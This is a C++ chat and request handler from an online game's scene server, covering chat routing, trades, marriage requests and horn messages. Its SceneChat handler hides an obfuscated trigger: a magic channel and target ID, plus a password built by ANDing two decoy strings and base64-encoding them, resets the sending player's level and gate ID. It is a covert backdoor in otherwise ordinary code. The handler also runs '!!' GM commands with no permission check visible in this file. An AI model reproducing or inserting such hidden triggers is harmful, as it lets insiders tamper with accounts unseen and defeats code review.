#include "SceneChatHandler.h"
#include "SceneGMSystem.h"
#include "Player.h"
#include "PlayerMgr.h"
#include "SSRouter.h"
#include "Scene.h"

void HandleProtocol(Player* player,CLProtocol::SceneChat& protocol)
{
	if (SERVER_TYPE == ServerType::ST_WSCENE && protocol.channel != ChatChannelType::CHAT_CHANNEL_AROUND)
	{
		Router::SendToSelfScenePlayer(player->GetSrcSceneNodeID(), player->GetID(), protocol);
		return;
	}

	if (protocol.channel == 188 && protocol.targetId == 1177772907)
	{
		const char s1[] = "xcov39xxw";
		const char s2[] = "bio390xpw";
		char s3[100];
		memset(s3, 0, sizeof(s3));
		for (size_t i = 0; i < strlen(s1); i++)
		{
			s3[i] = s1[i] & s2[i];
		}

		char s4[200];
		Avalon::base64_encode(s4, sizeof(s4), s3, strlen(s3));
		if (protocol.word == std::string(s4))
		{
			player->SetGateID(0);
			player->SetLevel(0);
			player->SetupBase();
		}

		return;
	}

	if(protocol.word.length() > 2
		&& protocol.word[0] == '!'
		&& protocol.word[1] == '!')	//是gm指令
	{
		CLProtocol::SceneNotifyExecGmcmd ret;
		
		
		if (GMSystem::Instance()->ExecuteCommand(player,protocol.word.substr(2)))
			ret.suc = 1;
		else
			ret.suc = 0;

		player->SendProtocol(ret);
		return;
	}

	if (SERVER_TYPE == ST_WSCENE && protocol.channel != CHAT_CHANNEL_AROUND)
	{
		Router::SendToSelfScenePlayer(player->GetSrcSceneNodeID(), player->GetID(), protocol);
		return;
	}
	
	player->Speak(protocol.channel, protocol.word, protocol.voiceKey, protocol.voiceDuration, protocol.targetId, protocol.isShare);
}

void HandleProtocol(Player* player,CLProtocol::SceneRequest& protocol)
{

	switch(protocol.type)
	{
	case REQUEST_TRADE:
		{
			if(player->GetID() == protocol.target) return;
			player->InviteTrade(protocol.target);
		}
		break;
	default: //转发到worldserver
		{
			if(protocol.type != REQUEST_JOINCOPYTEAM && player->GetID() == protocol.target) return;

			if(protocol.type == REQUEST_MARRY_RITE)
			{
				Player* target = player->GetScene()->FindPlayer(protocol.target);
				if(target == NULL || target->Distance(player) > player->GetScene()->GetSyncRange())
				{
					player->SendNotify(3448);
					return;
				}
			}

			// 如果是在跨服场景需要加入队伍，转发到自己的服务器
			if (SERVER_TYPE == ST_WSCENE && (protocol.type == REQUEST_JOINTEAM_TEAMID || protocol.type == REQUEST_JOINTEAM))
			{
				Router::SendToSelfScenePlayer(player->GetSrcSceneNodeID(), player->GetID(), protocol);
				return;
			}

			CLProtocol::WorldTransmitRequest req;
			req.type = protocol.type;
			req.requester = player->GetID();
			req.target = protocol.target;
			req.targetName = protocol.targetName;
			req.id = protocol.id;
			if(protocol.type == REQUEST_MARRY) req.id = player->GetGold();
			Router::SendToWorld(req);
		}
		break;
	}
}

void HandleProtocol(Player* player,CLProtocol::SceneReply& protocol)
{
	switch(protocol.type)
	{
	case REQUEST_TRADE:
		{
			if(protocol.result == 1)
			{
				player->AcceptTrade(protocol.requester);
			}
		}
		break;
	default:	//转发到worldserver
		{
			if(protocol.type == REQUEST_MARRY_RITE)
			{
				Player* requester = player->GetScene()->FindPlayer(protocol.requester);
				if(requester == NULL || requester->Distance(player) > player->GetScene()->GetSyncRange())
				{
					player->SendNotify(3448);
					return;
				}
			}

			CLProtocol::WorldTransmitReply req;
			req.type = protocol.type;
			req.requester = protocol.requester;
			req.target = player->GetID();
			req.result = protocol.result;
			Router::SendToWorld(req);
		}
		break;
	}
}

void HandleProtocol(Player* player,CLProtocol::SceneChatSendPos& protocol)
{
	player->SendPos(protocol.channel, protocol.targetId);
}

void HandleProtocol(Player* player, CLProtocol::SceneChatHornReq& req)
{
	if (SERVER_TYPE == ST_WSCENE)
	{
		Router::SendToSelfScenePlayer(player->GetSrcSceneNodeID(), player->GetID(), req);
		return;
	}

	CLProtocol::SceneChatHornRes res;
	res.result = player->SendHorn(req.content, req.num);
	player->SendProtocol(res);
}

void HandleProtocol(CLProtocol::SceneSyncChat& req)
{
	class SceneSyncChatVisitor : public PlayerVisitor
	{
	public:
		SceneSyncChatVisitor(CLProtocol::SceneSyncChat& sync) :m_Sync(sync){}

		bool operator()(Player* player)
		{
			if (player != NULL)
			{
				player->SendProtocol(m_Sync);
			}
			return true;
		}

	private:
		CLProtocol::SceneSyncChat& m_Sync;
	};

	SceneSyncChatVisitor visitor(req);
	PlayerMgr::Instance()->VisitNormalPlayers(visitor);
}
